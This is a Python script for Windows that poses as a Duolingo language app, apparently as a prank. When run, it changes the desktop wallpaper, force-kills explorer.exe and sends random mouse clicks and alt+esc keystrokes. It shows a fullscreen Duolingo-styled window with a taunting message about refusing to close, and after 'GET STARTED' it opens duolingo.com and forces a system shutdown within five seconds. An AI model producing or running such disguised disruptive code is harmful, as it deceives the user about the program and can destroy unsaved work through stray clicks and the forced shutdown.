import tkinter as tk
import os
import webview as wv
from tkinter import messagebox as msgb
import pyautogui as pag
import random as rd
import ctypes as ct

def change_paper(path):
    ct.windll.user32.SystemParametersInfoW(20,0, path,0)

def start():
    global wd,ad_img
    #wd.protocol("WM_DELETE_WINDOW",wd.destroy())
    wd.destroy()

    nwd = tk.Tk()
    nwd.protocol("WM_DELETE_WINDOW",msgb.showerror(title="!",message="Don\'t try to close the window,\nI am the ALMIGHTY DUOLINGO OWL !!"))
    ad_img = tk.PhotoImage(file = ".\\ad.png")
    duo_l = tk.Label(nwd,image=ad_img)
    duo_l.pack()

    # Create a GUI window to view the HTML content
    wv.create_window('Duolingo', 'https://www.duolingo.com',fullscreen=True,confirm_close=True)
    
    wv.start()

    os.system("shutdown -s -t 5")

    


def main():
    global wd,ad_img
    path = "\\".join(__file__.split("\\")[0:-1])
    change_paper(path+"\\ad.png")
    wd = tk.Tk()
    wd.title("Duolingo")
    

    software_img = tk.PhotoImage(file = ".\\software.png")
    logo_img = tk.PhotoImage(file = ".\\logo.png")

    wd.config(bg="#57CC02")
    wd.iconphoto(False, software_img)
    

    try:
        os.system("taskkill /IM \"explorer.exe\" /F")
    except:
        print("err")
    
    for i in range(7):
        pag.hotkey("alt","esc")
        a = pag.position()
        pag.click(a.x+rd.randint(-5,5)*30,a.y+rd.randint(-7,7)*30)
        

    wd.attributes('-fullscreen',True)

    img_l = tk.Label(wd,image=logo_img,compound="top",text="The free, fun, and effective way to\nlearn a language!",font=("Arial Rounded MT Bold",20),bg="#57CC02")
    img_l.pack(anchor="center")

    start_b= tk.Button(wd,text = "GET STARTED",command = start,bg="#57CC02",fg="#FFFFFF",font=("Arial Rounded MT Bold",30),relief="groove")
    start_b.pack(anchor="s")

    wd.protocol("WM_DELETE_WINDOW",msgb.showerror(title="!",message="Don\'t try to close the window,\nI am the ALMIGHTY DUOLINGO OWL !!"))
    wd.mainloop()


if __name__ == "__main__":
    main()